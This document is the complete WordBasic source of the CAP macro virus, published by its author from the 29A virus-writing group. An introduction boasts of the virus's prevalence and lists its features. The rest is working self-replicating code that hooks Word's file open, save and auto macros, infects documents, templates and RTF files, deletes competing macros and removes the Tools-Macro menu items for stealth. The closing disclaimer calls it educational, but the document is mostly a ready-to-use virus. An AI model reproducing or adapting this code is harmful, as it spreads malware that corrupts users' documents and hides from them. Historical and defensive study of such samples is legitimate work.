   '
   '                                                ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   '          WordMacro.CAP                         ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   '          by Jacky Qwerty/29A                    ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   '                                                ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   '                                                ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   '
   ' Hello people, well here it is. Theres  nothin more to say about this babe.
   ' It has ranked first in several "Top 10 virus" listz  as the most prevalent
   ' virus and  has kicked several AVer's assez  out there due to its suposedly
   ' "complex" featurez - well F-Potatoe says erm.. 8*/ - and by its ability to
   ' create spontaneously generated variantz  from itself.  It is the CAP macro
   ' virus and here is its full source code, bein first released in 29A#2.
   '
   ' Most of the CAP featurez  have been  fully described before, includin some
   ' comented  code fragmentz. The main diference  between  the followin source
   ' code  and the original i wrote  some months ago is that this code has been
   ' indented for better understandin, while the original version was left-jus-
   ' tified  prior to release.  At this  point i think  its worthless to coment
   ' each line in the virus code considerin it has been done in full detail be-
   ' fore.  For that purpose i suggest  to read the past articlez: "Macro virus
   ' tricks" and "WordMacro.CAP description" for further information. Here only
   ' a quick review of the CAP main featurez is given:
   '
   ' * No "SaveAs" problem: drive, path and format work in SaveAs dialog boxez.
   ' * Works in all existing Word languagez. Automacroz not needed for this.
   ' * Works in all Word platformz: PC, MAC, POWERMAC, etc. some virusez can't.
   ' * Guaranted to survive even if other macro virusez are currently present.
   ' * Internal generation count implemented, not using any .INI to store it.
   ' * Full stealth implemented, either by disabling or/and deleting submenuz.
   ' * Infects RTF filez too, i.e. saves them as templatez as with any DOC.
   ' * No payload. As the guy from NesCafee who wrote the Concept virus said:
   '   "This is enough to prove my point" #8).
   '
   '
   ' Who TF is CAP ?
   ' ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ' This virus was dedicated to a well known corrupt political figure in Vene-
   ' zuela: Carlos Andr‚s P‚rez, better known  as CAP, alias "El Gocho", former
   ' president of Venezuela twice, durin the late 70's and the late 80's. Seve-
   ' ral eventz  in the social history of Venezuela  were badly marked  by this
   ' prepotent stubborn ninja turtle headed man, most notably durin the Septem-
   ' ber 1996 timeframe, when to the astonished sight of  more than one million
   ' people, he was found "not guilty"  for the chargez of robery and malversa-
   ' tion of public fundz.  After the judgement, he was already planin his can-
   ' didature to postulate for the next presidential electionz. Grrr...
   '
   ' All these eventz encouraged the writin of this virus in mishap of this so-
   ' cial human virus known as CAP. The internal stringz translate as:
   '
   '     C.A.P: a social virus.. and now a digital one..
   '     "j4cKy Qw3rTy" (jqw3rty@hotmail.com).
   '     Venezuela, Maracay, Dic 1996.
   '     P.S. Whatcha doin gochito? You'll never be Simon Bolivar.. Clown!
   '
   '
   ' Greetz
   ' ÄÄÄÄÄÄ
   ' The greetz go this time to:
   '
   '   All the guyz from undernet and effnet #virus on IRC: keep lamerz out ;)
   '   Microsoft for such big holez in their office aplicationz: drunk boyz..!
   '
   '
   ' Disclaimer
   ' ÄÄÄÄÄÄÄÄÄÄ
   ' This sample code is for educational purposez only.  The author is not res-
   ' ponsible for any problemz caused due to use/misuse of this file.
   '
   '
   ' (c) 1997. Jacky Qwerty / 29A.


   Macro: CAP - description: "F%"
   ÄÄÄÄÄÄÄÄÄÄ

   Sub MAIN
   'C.A.P: Un virus social.. y ahora digital..
   '"j4cKy Qw3rTy" (jqw3rty@hotmail.com).
   'Venezuela, Maracay, Dic 1996.
   'P.D. Que haces gochito ? Nunca seras Simon Bolivar.. Bolsa !
   End Sub

   Dim Shared M$(9)

   Sub S(F$)
     On Error Resume Next
     S$ = "F%"                     'virus mark
     D$ = "Macro"
     C$ = "Close"
     B$ = "Open"
     A$ = "File"
     M$(0) = "CAP"                 'build namez for the basic set of macroz
     M$(3) = A$ + C$
     M$(5) = A$ + "Save"
     M$(2) = A$ + B$
     M$(9) = A$ + "Templates"
     A$ = "Auto"
     M$(6) = M$(5) + "As"
     M$(1) = A$ + B$
     M$(8) = A$ + "Exec"
     M$(4) = A$ + C$
     M$(7) = "Tools" + D$
     M = 0
     N = 0
     For T = 1 To 0 Step - 1                       'scan macros inside global
       For I = CountMacros(T) To 1 Step - 1        '  and active template and
         B$ = MacroName$(I, T)                     '  delete all foreign macroz
         If S$ = Left$(MacroDesc$(B$), 2) Then
           For J = 0 To 9
             If B$ = M$(J) Then
               If T Then N = N + 1 Else M = M + 1
               J = 9
             End If
           Next
         Else
           ToolsMacro .Name = B$, .Show = T + T + 1, .Delete
         End If
       Next
     Next
     If F$ <> "" Then
       If M < 10 And N Then                'global template infection
         ToolsOptionsSave .GlobalDotPrompt = 0, .FastSaves = 1, .AutoSave = 1, .SaveInterval = "10"
         For I = 0 To 9                            'copy basic set of macroz
           If I <> 7 Then K = - 1 Else K = 0
           MacroCopy F$ + ":" + M$(I), M$(I), K
         Next
         'increment generation count
         B$ = S$ + LTrim$(Str$(Val(Mid$(MacroDesc$(M$(7)), 3)) + 1))
         ToolsMacro .Name = M$(7), .Show = 1, .Description = B$, .SetDesc
         A$ = MenuText$(0, 1)                      'copy localized file
         For I = CountMacros(1) To 1 Step - 1      '  related macroz
           J = 0
           B$ = MacroName$(I, 1)
           Select Case MacroDesc$(B$)
             Case S$ + "O"
               J = 2
             Case S$ + "C"
               J = 3
             Case S$ + "S"
               J = 5
             Case S$ + "SA"
               J = 6
           End Select
           If J Then
             C$ = MenuItemMacro$(A$, 0, J)
             If Left$(UCase$(C$), Len(M$(J))) <> UCase$(M$(J)) And Left$(C$, 1) <> "(" Then MacroCopy F$ + ":" + B$, C$, K
           End If
         Next
         T = - 1
         For I = 0 To 1                    'delete menu itemz (ToolsMacro, etc.)
           If I Then J = 1 Else J = 6
           A$ = MenuText$(I, J)
           J = CountMenuItems(A$, I) - 1
           For M = J To 1 Step - 1
             If InStr(MenuItemMacro$(A$, I, M), D$) Then
               If I Then
                 B$ = MenuItemMacro$(A$, I, M - 2)
                 If UCase$(B$) <> UCase$(M$(9)) And Left$(B$, 1) <> "(" Then MacroCopy M$(9), B$, K
               Else
                 M = M + 1
               End If
               For T = M To M - 1 Step - 1
                 If T > 3 Then ToolsCustomizeMenus .MenuType = I, .Position = T, .Name = MenuItemMacro$(A$, I, T), .Menu = A$, .Remove, .Context = 0
               Next
               M = 1
               T = 0
             End If
           Next
         Next
         If T Then
           For I = 6 To J
             If Left$(MenuItemMacro$(A$, 1, I), 1) = "(" And Left$(MenuItemMacro$(A$, 1, I - 2), 1) = "(" Then
               For T = 1 To 3 Step 2
                 B$ = MenuItemMacro$(A$, 1, I - T)
                 If Left$(B$, 1) <> "(" Then MacroCopy M$(T + 6), B$, K
               Next
               I = J
             End If
           Next
         End If
       End If
       Dim D As FileSaveAs         'document, template and RTF infection
       GetCurValues D
       If N < 10 And D.Format = 1 Or D.Format = 0 Or D.Format = 6 Then
         D.Format = 1
         For I = CountMacros(0) To 1 Step - 1
           B$ = MacroName$(I, 0)
           If B$ <> M$(7) Then K = - 1 Else K = 0
           MacroCopy B$, F$ + ":" + B$, K
         Next
         FileSaveAs D
       End If
     End If
     Err = 0
   End Sub

   Sub FO                          'FileOpen macro jumps here
     On Error Resume Next
     DisableAutoMacros
     On Error Goto E
     Dim D As FileOpen
     GetCurValues D
     Dialog D
     FileOpen D
     S(D.Name)
   E:
   End Sub

   Sub FC                          'FileClose macro jumps here
     On Error Resume Next
     DisableAutoMacros
     S(FileName$())
     FileClose
   End Sub

   Sub FS                          'FileSave macro jumps here
     On Error Resume Next
     DisableAutoMacros
     On Error Goto F
     FileSave
     S(FileName$())
   F:
   End Sub

   Sub FSA                         'FileSaveAs macro jumps here
     On Error Resume Next
     DisableAutoMacros
     On Error Goto G
     Dim D As FileSaveAs
     GetCurValues D
     If D.Format <> 1 Then
       Dialog D
       FileSaveAs D
       S(D.Name)
     Else
       T = Window()
       W$ = D.Name
       FileNew .Template = FileName$()
       On Error Goto H
       GetCurValues D
       D.Name = W$
       Dialog D
       FileSaveAs D
       On Error Goto G
       S(D.Name)
       If T >= Window() Then T = T + 1
       WindowList T
     H:
       FileClose 2
     End If
   G:
   End Sub

   Macro: FileClose - description: "F%C"
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Sub MAIN
     On Error Resume Next
     CAP.FC
   End Sub

   Macro: FileOpen - description: "F%O"
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Sub MAIN
     On Error Resume Next
     CAP.FO
   End Sub

   Macro: FileSave - description: "F%S"
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Sub MAIN
     On Error Resume Next
     CAP.FS
   End Sub

   Macro: FileSaveAs - description: "F%SA"
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Sub MAIN
     On Error Resume Next
     CAP.FSA
   End Sub

   Macro: AutoClose - description: "F%"
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Sub MAIN
     On Error Resume Next
     CAP.S(FileName$())
   End Sub

   Macro: AutoExec - description: "F%"
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Sub MAIN
     On Error Resume Next
     DisableAutoMacros 0
     CAP.S("")
   End Sub

   Macro: AutoOpen - description: "F%"
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Sub MAIN
     On Error Resume Next
     CAP.S(FileName$())
   End Sub

   Macro: FileTemplates - description: "F%"
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Sub MAIN
   End Sub

   Macro: ToolsMacro - description: "F%0"  'this macro holds the generation count
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Sub MAIN
   End Sub

   ' End
